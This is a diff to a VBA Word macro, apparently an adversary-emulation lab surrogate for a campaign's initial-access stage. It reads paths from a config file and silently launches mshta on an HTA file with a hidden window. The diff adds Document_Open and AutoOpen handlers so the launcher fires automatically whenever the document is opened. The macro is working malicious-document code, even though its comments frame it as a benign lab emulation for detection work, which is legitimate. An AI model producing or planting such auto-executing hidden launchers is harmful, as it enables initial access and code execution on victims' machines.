@@ -1,14 +1,19 @@
 Attribute VB_Name = "c0015Entry"
 ' ============================================================
-' c0015 entry macro (benign, config-driven) — [LAB-SURROGATE]
-' Maps to campaign: T1204.002 (user execution via Word macro),
-' T1059.005 (VBA). Mirrors DFIR: macro triggers the HTA bootstrap.
+' c0015 entry macro (benign, config-driven) - [LAB-SURROGATE]
+' Maps to the source campaign: T1204.002 (user execution via Word
+' macro), T1059.005 (VBA). Mirrors DFIR: macro launches the HTA
+' bootstrap.
 '
-' NO HARDCODED LAB VALUES: hta path / mshta path are read from
-' %PUBLIC%\C0015\config.ini. If config is missing -> macro does
+' NO HARDCODED LAB VALUES: the HTA path and mshta path are read from
+' %PUBLIC%\C0015\config.ini. If config is absent the macro does
 ' nothing (this is the CONTROL path, not an error fallback).
+'
+' Word auto-execution: both Document_Open and AutoOpen call the same
+' entry so the document runs whichever auto macro Word recognizes on
+' the installed build.
 ' ============================================================
-Private Sub Document_Open()
+Private Sub RunEntry()
     On Error GoTo FailSafe
 
     Dim fso As Object
@@ -37,5 +42,13 @@ Private Sub Document_Open()
     sh.Run """" & mshtaPath & """ """ & htaPath & """", 0, False
     Exit Sub
 FailSafe:
-    ' silent fail = control behavior; lab documents that no chain is created
+    ' silent fail = control behavior; no chain is created
+End Sub
+
+Public Sub Document_Open()
+    RunEntry
+End Sub
+
+Public Sub AutoOpen()
+    RunEntry
 End Sub
